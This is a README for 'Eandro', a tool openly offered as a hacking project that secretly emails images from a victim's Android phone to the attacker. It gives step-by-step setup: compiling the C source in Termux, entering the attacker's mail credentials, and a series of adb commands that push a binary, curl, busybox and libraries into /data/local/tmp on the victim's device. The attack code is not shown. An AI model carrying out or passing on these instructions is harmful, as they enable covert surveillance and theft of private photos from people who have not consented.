# Eandro

Eandro is a Hacking Project to Automatical send Image of victim to Your Mail ID

Things You Need Above files
Copy Everything to your sdcard OR to your computer .

Make Sure adb Works either in Computer or Mobile Phone

1 . Install adb in Android or Computer

2 . Download Files that i Provided

3 . Download Eandro.c code to your Mobile or computer

4 . And here tough part comes install clang in Android or computer 

5 . To install clang in android install Termux in Android and type "apt install clang" without quotes.

6 . After install the c Compiler compile the code that i gave change the email and password and also from and to mail addresses

7 . To compile c code in android copy the /data/data/com.termux/files/home/ i.e Home Directory and type "gcc eandro.c -o eandro" [ Without Quotes ]

8 . Next you need to push all files and compiled binaryfile to /data/local/tmp/ of the Victims Mobile

To Push the Files you need to follow the steps

In Android : Below Command are steps to push the files to Victims Mobile if adb supports to your mobile i included adb binary file here download it

I suggest to download Termux and install certain packages 

apt install git 

apt install clang

after successfully installtion of these two proceed following steps

cd /data/data/com.termux/files/home/

git clone git@github.com:maddalakum/Eandro.git

cd /data/data/com.termux/files/home/Eandro/lib64/ ; 

adb shell "if [ ! -d /data/local/tmp/lib64 ] ; then mkdir /data/local/tmp/lib64 ; chmod 777 /data/local/tmp/lib64;fi " ; 

for i in `ls`; do  adb push $i /data/local/tmp/lib64/ ; done ; 

adb push ../curl /data/local/tmp/ ; 

adb push ../busybox /data/local/tmp/

In Computer download the Zip file place the file in desktop and unzip and push the files normall as i said to android

Watch My Video to how to do it 

https://www.youtube.com/channel/UCYgXhhbtAuFHOKsNDujcxzQ
